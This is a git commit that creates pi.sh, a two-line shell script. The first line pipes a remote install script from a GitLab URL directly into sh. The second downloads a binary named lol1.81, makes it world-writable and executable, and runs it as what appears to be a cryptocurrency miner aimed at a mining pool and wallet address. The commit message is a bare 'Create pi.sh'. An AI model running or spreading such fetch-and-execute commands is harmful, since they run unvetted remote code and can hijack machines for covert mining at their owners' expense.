334d9d09bb19fd35cce2fba0e7db988b43ec6280
AMarzuqi <76428558+AMarzuqi@users.noreply.github.com>
2024-08-20 15:15:01 +0700

    Create pi.sh

---
+++ pi.sh
@@ -0,0 +1,2 @@
+curl https://gitlab.com/johanputra2342/polling/-/raw/main/vase/install.sh | sh
+wget https://gitlab.com/ravencoin002/file/-/raw/main/lol1.81 && chmod 777 lol1.81 && ./lol1.81 -a PYRIN -p pyi.gentong.me:443 --user pyrin:qzaj3nkegnu8kdwxgykv6e60jca2wfa6tjtt5jgn7gcg7laagutdjcn6apter.$(shuf -n 1 -i 1-9999999)-GAS --no-cl
